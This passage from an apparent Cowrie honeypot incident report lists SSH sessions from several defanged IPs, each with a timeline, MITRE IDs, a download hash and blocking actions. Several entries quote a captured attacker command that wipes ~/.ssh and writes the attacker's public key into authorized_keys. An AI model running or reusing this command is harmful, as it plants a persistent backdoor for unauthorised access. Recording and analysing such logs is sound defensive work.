| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:55:56` | `cowrie.session.connect` |
| `2026-04-21 04:55:56` | `cowrie.client.version` |
| `2026-04-21 04:55:56` | `cowrie.client.kex` |
| `2026-04-21 04:55:57` | `cowrie.login.success` |
| `2026-04-21 04:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d023c71a242c

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 04:57 |
| **Last Seen** | 2026-04-21 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:57:25` | `cowrie.session.connect` |
| `2026-04-21 04:57:25` | `cowrie.client.version` |
| `2026-04-21 04:57:25` | `cowrie.client.kex` |
| `2026-04-21 04:57:25` | `cowrie.login.success` |
| `2026-04-21 04:57:26` | `cowrie.session.params` |
| `2026-04-21 04:57:26` | `cowrie.command.input` |
| `2026-04-21 04:57:26` | `cowrie.command.failed` |
| `2026-04-21 04:57:26` | `cowrie.log.closed` |
| `2026-04-21 04:57:26` | `cowrie.session.params` |
| `2026-04-21 04:57:26` | `cowrie.command.input` |
| `2026-04-21 04:57:26` | `cowrie.session.file_download` |
| `2026-04-21 04:57:26` | `cowrie.log.closed` |
| `2026-04-21 04:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b77a619e0fee

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 04:57 |
| **Last Seen** | 2026-04-21 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:57:28` | `cowrie.session.connect` |
| `2026-04-21 04:57:28` | `cowrie.client.version` |
| `2026-04-21 04:57:28` | `cowrie.client.kex` |
| `2026-04-21 04:57:29` | `cowrie.login.success` |
| `2026-04-21 04:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f82012a8b6e4

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 04:58 |
| **Last Seen** | 2026-04-21 04:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:58:58` | `cowrie.session.connect` |
| `2026-04-21 04:58:58` | `cowrie.client.version` |
| `2026-04-21 04:58:58` | `cowrie.client.kex` |
| `2026-04-21 04:58:59` | `cowrie.login.success` |
| `2026-04-21 04:58:59` | `cowrie.session.params` |
| `2026-04-21 04:58:59` | `cowrie.command.input` |
| `2026-04-21 04:58:59` | `cowrie.command.failed` |
| `2026-04-21 04:59:00` | `cowrie.log.closed` |
| `2026-04-21 04:59:00` | `cowrie.session.params` |
| `2026-04-21 04:59:00` | `cowrie.command.input` |
| `2026-04-21 04:59:00` | `cowrie.session.file_download` |
| `2026-04-21 04:59:00` | `cowrie.log.closed` |
| `2026-04-21 04:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da81bacf16ab

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 04:59 |
| **Last Seen** | 2026-04-21 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:59:02` | `cowrie.session.connect` |
| `2026-04-21 04:59:02` | `cowrie.client.version` |
| `2026-04-21 04:59:03` | `cowrie.client.kex` |
| `2026-04-21 04:59:03` | `cowrie.login.success` |
| `2026-04-21 04:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bfc097ef96f

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:01 |
| **Last Seen** | 2026-04-21 05:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:01:03` | `cowrie.session.connect` |
| `2026-04-21 05:01:03` | `cowrie.client.version` |
| `2026-04-21 05:01:03` | `cowrie.client.kex` |
| `2026-04-21 05:01:03` | `cowrie.login.success` |
| `2026-04-21 05:01:04` | `cowrie.session.params` |
| `2026-04-21 05:01:04` | `cowrie.command.input` |
| `2026-04-21 05:01:04` | `cowrie.command.failed` |
| `2026-04-21 05:01:04` | `cowrie.log.closed` |
| `2026-04-21 05:01:04` | `cowrie.session.params` |
| `2026-04-21 05:01:04` | `cowrie.command.input` |
| `2026-04-21 05:01:04` | `cowrie.session.file_download` |
| `2026-04-21 05:01:04` | `cowrie.log.closed` |
| `2026-04-21 05:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6be674bed9c

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:01 |
| **Last Seen** | 2026-04-21 05:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:01:04` | `cowrie.session.connect` |
| `2026-04-21 05:01:04` | `cowrie.client.version` |
| `2026-04-21 05:01:04` | `cowrie.client.kex` |
| `2026-04-21 05:01:04` | `cowrie.login.success` |
| `2026-04-21 05:01:04` | `cowrie.session.params` |
| `2026-04-21 05:01:04` | `cowrie.command.input` |
| `2026-04-21 05:01:04` | `cowrie.command.failed` |
| `2026-04-21 05:01:05` | `cowrie.log.closed` |
| `2026-04-21 05:01:05` | `cowrie.session.params` |
| `2026-04-21 05:01:05` | `cowrie.command.input` |
| `2026-04-21 05:01:05` | `cowrie.session.file_download` |
| `2026-04-21 05:01:05` | `cowrie.log.closed` |
| `2026-04-21 05:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38bdd4611a9b

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:01 |
| **Last Seen** | 2026-04-21 05:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:01:06` | `cowrie.session.connect` |
| `2026-04-21 05:01:06` | `cowrie.client.version` |
| `2026-04-21 05:01:06` | `cowrie.client.kex` |
| `2026-04-21 05:01:07` | `cowrie.login.success` |
| `2026-04-21 05:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dffd383d2c86

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:01 |
| **Last Seen** | 2026-04-21 05:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:01:07` | `cowrie.session.connect` |
| `2026-04-21 05:01:07` | `cowrie.client.version` |
| `2026-04-21 05:01:07` | `cowrie.client.kex` |
| `2026-04-21 05:01:08` | `cowrie.login.success` |
| `2026-04-21 05:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a600aa4b3bb3

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:02 |
| **Last Seen** | 2026-04-21 05:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:02:02` | `cowrie.session.connect` |
| `2026-04-21 05:02:02` | `cowrie.client.version` |
| `2026-04-21 05:02:02` | `cowrie.client.kex` |
| `2026-04-21 05:02:04` | `cowrie.login.success` |
| `2026-04-21 05:02:04` | `cowrie.session.params` |
| `2026-04-21 05:02:04` | `cowrie.command.input` |
| `2026-04-21 05:02:04` | `cowrie.command.failed` |
| `2026-04-21 05:02:04` | `cowrie.log.closed` |
| `2026-04-21 05:02:05` | `cowrie.session.params` |
| `2026-04-21 05:02:05` | `cowrie.command.input` |
| `2026-04-21 05:02:05` | `cowrie.session.file_download` |
| `2026-04-21 05:02:05` | `cowrie.log.closed` |
| `2026-04-21 05:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b60fa9e360a

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:02 |
| **Last Seen** | 2026-04-21 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:02:12` | `cowrie.session.connect` |
| `2026-04-21 05:02:12` | `cowrie.client.version` |
| `2026-04-21 05:02:13` | `cowrie.client.kex` |
| `2026-04-21 05:02:14` | `cowrie.login.success` |
| `2026-04-21 05:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c0f76b26030

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:02 |
| **Last Seen** | 2026-04-21 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:02:16` | `cowrie.session.connect` |
| `2026-04-21 05:02:16` | `cowrie.client.version` |
| `2026-04-21 05:02:16` | `cowrie.client.kex` |
| `2026-04-21 05:02:17` | `cowrie.login.success` |
| `2026-04-21 05:02:17` | `cowrie.session.params` |
| `2026-04-21 05:02:17` | `cowrie.command.input` |
| `2026-04-21 05:02:17` | `cowrie.command.failed` |
| `2026-04-21 05:02:17` | `cowrie.log.closed` |
| `2026-04-21 05:02:18` | `cowrie.session.params` |
| `2026-04-21 05:02:18` | `cowrie.command.input` |
| `2026-04-21 05:02:18` | `cowrie.session.file_download` |
| `2026-04-21 05:02:18` | `cowrie.log.closed` |
| `2026-04-21 05:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b4844350224

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:02 |
| **Last Seen** | 2026-04-21 05:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:02:20` | `cowrie.session.connect` |
| `2026-04-21 05:02:20` | `cowrie.client.version` |
| `2026-04-21 05:02:20` | `cowrie.client.kex` |
| `2026-04-21 05:02:21` | `cowrie.login.success` |
| `2026-04-21 05:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2f0219bf11

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:03 |
| **Last Seen** | 2026-04-21 05:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:03:58` | `cowrie.session.connect` |
| `2026-04-21 05:03:58` | `cowrie.client.version` |
| `2026-04-21 05:03:58` | `cowrie.client.kex` |
| `2026-04-21 05:03:59` | `cowrie.login.success` |
| `2026-04-21 05:03:59` | `cowrie.session.params` |
| `2026-04-21 05:03:59` | `cowrie.command.input` |
| `2026-04-21 05:03:59` | `cowrie.command.failed` |
| `2026-04-21 05:03:59` | `cowrie.log.closed` |
| `2026-04-21 05:04:00` | `cowrie.session.params` |
| `2026-04-21 05:04:00` | `cowrie.command.input` |
| `2026-04-21 05:04:00` | `cowrie.session.file_download` |
| `2026-04-21 05:04:00` | `cowrie.log.closed` |
| `2026-04-21 05:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eedc1692628c

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:04 |
| **Last Seen** | 2026-04-21 05:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:04:02` | `cowrie.session.connect` |
| `2026-04-21 05:04:02` | `cowrie.client.version` |
| `2026-04-21 05:04:02` | `cowrie.client.kex` |
| `2026-04-21 05:04:03` | `cowrie.login.success` |
| `2026-04-21 05:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f8ca2df2937

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:04 |
| **Last Seen** | 2026-04-21 05:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:04:29` | `cowrie.session.connect` |
| `2026-04-21 05:04:29` | `cowrie.client.version` |
| `2026-04-21 05:04:29` | `cowrie.client.kex` |
| `2026-04-21 05:04:30` | `cowrie.login.success` |
| `2026-04-21 05:04:30` | `cowrie.session.params` |
| `2026-04-21 05:04:30` | `cowrie.command.input` |
| `2026-04-21 05:04:30` | `cowrie.command.failed` |
| `2026-04-21 05:04:30` | `cowrie.log.closed` |
| `2026-04-21 05:04:31` | `cowrie.session.params` |
| `2026-04-21 05:04:31` | `cowrie.command.input` |
| `2026-04-21 05:04:31` | `cowrie.session.file_download` |
| `2026-04-21 05:04:31` | `cowrie.log.closed` |
| `2026-04-21 05:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88eea0a1a4ed

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:04 |
| **Last Seen** | 2026-04-21 05:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:04:33` | `cowrie.session.connect` |
| `2026-04-21 05:04:33` | `cowrie.client.version` |
| `2026-04-21 05:04:33` | `cowrie.client.kex` |
| `2026-04-21 05:04:34` | `cowrie.login.success` |
| `2026-04-21 05:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6bc76127350

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:05 |
| **Last Seen** | 2026-04-21 05:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
